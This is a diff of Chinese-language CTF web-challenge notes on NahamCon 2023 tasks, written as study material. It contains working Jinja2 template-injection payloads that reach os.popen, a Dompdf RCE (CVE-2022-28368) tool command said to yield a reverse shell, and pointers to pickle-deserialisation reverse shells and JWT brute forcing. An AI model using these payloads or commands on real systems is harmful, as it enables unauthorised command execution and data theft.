@@ -111,7 +111,8 @@ for i in range(300,1000):
 - `config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)`，参数a是要导入的模块（os），参数b是环境变量名（把getenv换了就能执行别的了）
 - `().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x6f,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()`
 - `().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ`
-
+- 例题
+    - [Obligatory](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Obligatory.md)（https://hackmd.io/@Chivato/HyWsJ31dI ）：`{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27cmd%27)|attr(%27read%27)()}}`
 - [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 1.  [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
@@ -2450,4 +2451,18 @@ gambling_contract = web3.eth.contract(address='', abi=gambling_abi)
 ```
 245. [Stickers](https://github.com/daffainfo/ctf-writeup/tree/main/NahamCon%20CTF%202023/Stickers)
 - CVE-2022-28368 - Dompdf RCE利用。使用工具： https://github.com/rvizx/CVE-2022-28368/tree/main。`python3 dompdf-rce.py --inject "将html转为pdf的url" --dompdf "http://vuln/dompdf/"`。该payload可以反弹shell。
-	- `Unable to stream pdf:headers already sent`为dompdf的错误提示
+	- `Unable to stream pdf:headers already sent`为dompdf的错误提示。还有另一种方法判断：由dompdf生成出来的pdf的exif Producer字段会写dompdf的版本。
+    - 使用php版本的[poc](https://github.com/positive-security/dompdf-rce)：https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Stickers.md
+246. [Marmalade 5](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon2023/Web/Marmalade_5.md)
+- jwt MD5_HMAC字典无第三方库爆破
+247. [Museum](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon2023/Web/Museum.md)
+- 本地文件包含（LFI）+ssrf。
+- fuzz工具[ffuf](https://github.com/ffuf/ffuf)+字典[SecLists](https://github.com/danielmiessler/SecLists/tree/master)（可用来测试文件包含）
+248. [Transfer](https://github.com/okadir/CTF-s/tree/main/nahamCon-2023/Transfer)
+- python sqlite注意事项：
+```py
+c.executescript(sql)
+res = c.fetchone()
+```
+以上代码永远无法查询出结果，除非把executescript换成execute。同时需要注意的是，executescript允许同时执行多条语句，可能会有堆叠注入。
+- python pickle反序列化RCE reverse shell。即使在目标机器curl，wget和nc均没有的情况下，仍然可以通过python命令反弹shell。
